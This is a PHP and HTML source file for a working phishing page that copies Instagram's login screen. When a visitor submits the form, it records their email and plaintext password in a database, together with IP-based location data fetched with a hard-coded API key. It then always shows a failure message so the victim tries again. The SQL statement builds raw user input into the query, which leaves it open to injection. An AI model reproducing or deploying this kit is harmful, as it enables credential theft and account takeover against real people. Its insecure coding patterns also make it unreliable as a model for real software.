<?php


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require_once("include/connection.php");

try {

    if (isset($_POST["submit"])) {
        function get_client_ip()
        {
            $ip = '';
            if (isset($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        $ip = get_client_ip();
        // echo $ip;

        // $my_ip = $_GET['ip'];

        $url = 'https://api.ip2location.io/?key=2E356E745332DB637417230C7997A646&ip=' . $ip;

        $response = file_get_contents($url);
        // echo $response;


        if ($response) {
            $data = json_decode($response, true); // Decode the JSON response into an associative array
            // echo $data;

            if ($data && is_array($data)) {
                foreach ($data as $key => $value) {
                    // echo "$key: $value <br >";
                    if ($key == 'ip') {
                        $ip_address = $value;
                    }
                    if ($key == 'country_name') {
                        $country_name = $value;
                    }
                    if ($key == 'region_name') {
                        $region_name = $value;
                    }
                    if ($key == 'city_name') {
                        $city_name = $value;
                    }
                }
            } else {
                // echo "Invalid JSON Data";
            }
        } else {
            // echo "API Request failed";
        }



        if (empty($_POST['email']) || empty($_POST['password'])) {
            $myerror = "Please fill in the blank fields";
        } else {
            $email = $_POST['email'];
            $password = $_POST['password'];
            // $password = password_hash($_POST['password'], PASSWORD_DEFAULT);



            $query = " INSERT INTO signup ( Email, Password, Country_name, Region_name, Ip_address, City_name) VALUES ('$email', '$password', '$country_name', '$region_name', '$ip_address', '$city_name') ";

            $result = mysqli_query($con, $query);

            if ($result) {
                $myerror = "Failed, Please try again.";
            } else {
                $myerror = "Failed, Please try again";
                //  header("location:instagram.php");
            }

        }
    } else {
        // echo "Connection failed" . mysqli_error($con);
        

    }

} catch (Exception $e) {
    // echo $e->getMessage();
}


?>



 



<html>

<head>
    <link rel="stylesheet" href="css/instagram.css">
    <link rel="icon"
        href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
        type="image/x-icon" />
</head>

<body>
    <span id="root">
        <section class="section-all">

            <!-- 1-Role Main -->
            <main class="main" role="main">
                <div class="wrapper">
                    <article class="article">
                        <div class="content">
                            <div class="login-box">
                                <div class="header">
                                    <img class="logo"
                                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                                        alt="Instagram">
                                </div><!-- Header end -->
                                <div class="form-wrap">
                                   <div style="color: red;">
                                        <?php
                                            // Check if $myerror is set and not empty
                                            if (!empty($myerror)) {
                                                echo '<p>' . $myerror . '</p>';
                                            }
                                        ?>
                                    </div>
                                     <form class="form" action="" method="post">

                                        <div class="input-box">
                                            <input type="text" id="name" aria-describedby=""
                                                placeholder="Phone number, username, or email" maxlength="30"
                                                autocapitalize="off" autocorrect="off" name="email">
                                        </div>

                                        <div class="input-box">
                                            <input type="password" name="password" id="password" placeholder="Password"
                                                aria-describedby="" maxlength="30" autocapitalize="off"
                                                autocorrect="off">
                                        </div>

                                        <span class="button-box">
                                            <button class="btn" type="submit" name="submit">Log in</button>
                                        </span>

                                        <a class="forgot" href="">Forgot password?</a>
                                    </form>
                                </div> <!-- Form-wrap end -->
                            </div> <!-- Login-box end -->

                            <div class="login-box">
                                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
                            </div> <!-- Signup-box end -->

                            <div class="app">
                                <p>Get the app.</p>
                                <div class="app-img">
                                    <a
                                        href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                                        <img
                                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
                                    </a>
                                    <a
                                        href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                                        <img
                                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                                    </a>
                                </div> <!-- App-img end-->
                            </div> <!-- App end -->
                        </div> <!-- Content end -->
                    </article>
                </div> <!-- Wrapper end -->
            </main>

            <!-- 2-Role Footer -->
            <footer class="footer" role="contentinfo">
                <div class="footer-container">

                    <nav class="footer-nav" role="navigation">
                        <ul>
                            <li><a href="">About Us</a></li>
                            <li><a href="">Support</a></li>
                            <li><a href="">Blog</a></li>
                            <li><a href="">Press</a></li>
                            <li><a href="">Api</a></li>
                            <li><a href="">Jobs</a></li>
                            <li><a href="">Privacy</a></li>
                            <li><a href="">Terms</a></li>
                            <li><a href="">Directory</a></li>
                            <li>
                                <span class="language">Language
                                    <select name="language" class="select" onchange="la(this.value)">
                                        <option value="#">English</option>
                                        <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                                    </select>
                                </span>
                            </li>
                        </ul>
                    </nav>

                    <span class="footer-logo">&copy; 2023 Instagram</span>
                </div> <!-- Footer container end -->
            </footer>

        </section>
    </span> <!-- Root -->

    <!-- Select Link -->
    <script type="text/javascript">
        function la(src) {
            window.location = src;
        }
    </script>
</body>

</html>